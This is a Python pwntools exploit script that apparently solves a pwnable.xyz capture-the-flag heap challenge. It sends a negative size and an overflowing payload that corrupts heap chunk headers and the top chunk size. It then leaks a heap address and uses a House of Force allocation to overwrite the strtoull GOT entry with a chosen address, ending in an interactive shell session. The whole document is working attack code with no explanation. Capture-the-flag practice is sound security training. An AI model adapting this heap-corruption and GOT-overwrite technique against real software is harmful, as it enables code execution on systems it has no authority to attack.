from pwn import*

#context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30041)
e = ELF("challenge")

def add(size,title,note):
	s.sendlineafter("> ","1")
	s.sendlineafter("Size: ",str(size))
	s.sendlineafter("Title: ",title)
	s.sendlineafter("Note: ",note)

def edit(idx,note):
	s.sendlineafter("> ","2")
	s.sendlineafter("Note: ",str(idx))
	s.sendlineafter("Data: ",note)

def show():
	s.sendlineafter("> ","3")

pause()

s.sendlineafter("> ","1")
s.sendlineafter("Size: ","-1")
s.sendlineafter("Title: ","AAAA")

add(8,"A","A")

pay = "A"*8 + p64(0x31) + "A"*40 + p64(0x21) + p64(0x100) + p64(0x6012A0) + "A"*8 + p64(0x31) + "A"*40 + "\xff\xff\xff\xff\xff\xff\xff\xff"

edit(0,pay)
show()

s.recvuntil("\n")
heap = u64(s.recv(4)+"\x00\x00\x00\x00")
top_chunk = heap + 0x98
size = (e.got['strtoull'] - top_chunk) - 16

s.sendlineafter("> ","1")
s.sendlineafter("Size: ",str(size))
s.sendlineafter("Title: ",p64(0x4008A2))

s.sendlineafter("> ","1")
s.sendlineafter("Size: ","1")

s.interactive()
